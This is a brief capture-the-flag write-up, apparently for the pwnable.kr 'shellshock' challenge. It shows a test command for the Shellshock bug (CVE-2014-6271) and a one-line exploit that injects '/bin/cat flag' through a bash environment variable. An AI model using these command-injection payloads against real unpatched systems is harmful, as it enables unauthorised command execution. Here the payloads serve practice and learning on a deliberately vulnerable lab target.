---
layout:     post
title:      pwnable shellshock
author:     wooy0ung
tags: 		pwn
category:  	writeup
---


>Problem Address:  
>http://pwnable.kr/  
>  
>Problem Description:  
>Daddy bought me a system command shell.  
>but he put some filters to prevent me from playing with it without his permission...  
>but I wanna play anytime I want!  
>Address:  
>ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1)  
<!-- more -->


### 0x00 exploit

CVE-2014-6271 破壳漏洞利用, 先检验漏洞是否存在

```
$ env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
```

![](/assets/img/writeup/pwn/2017-08-27-pwnable-shellshock/0x00.png)

构造一下利用

```
$ env x='() { :;}; /bin/cat flag' bash -c "./shellshock"
```

getflag~

![](/assets/img/writeup/pwn/2017-08-27-pwnable-shellshock/0x01.png)